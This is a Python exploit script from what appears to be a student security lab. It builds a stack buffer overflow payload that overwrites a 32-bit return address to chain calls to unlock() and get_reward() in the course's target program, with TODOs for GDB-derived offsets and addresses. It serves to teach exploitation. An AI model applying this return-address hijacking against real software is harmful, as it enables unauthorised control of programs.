#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits)
STUDENT_ID = 4               # TODO: Replace with your ID

# Unlock code (derived from your Student ID)
UNLOCK_CODE = 0xA5A5A000 + STUDENT_ID

# Addresses — printed by the target program
unlock_addr = 0x5655628d     # TODO: Replace with unlock() address
get_reward_addr = 0x565562f6 # TODO: Replace with get_reward() address

# Offset from buffer start to return address
# Use GDB: offset = ($ebp - &buffer) + 4
offset = 76                   # TODO: Replace with actual offset

# Total size of the payload (should match READ_SZ in target.c)
read_sz = 264                  # TODO: Replace with your READ_SZ value

# ============================================================
# Construct the payload
# ============================================================

content = bytearray(0x41 for i in range(read_sz))

# TODO: Chain the function calls on the stack:
#
# Step 1: Overwrite return address with unlock()
content[offset:offset+4] = p32(unlock_addr)
#
# Step 2: Set unlock()'s return address to get_reward()
content[offset+4:offset+8] = p32(get_reward_addr)
#
# Step 3: Place UNLOCK_CODE as the argument to unlock()
content[offset+8:offset+12] = p32(UNLOCK_CODE)

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(content)

print("badfile generated successfully!")
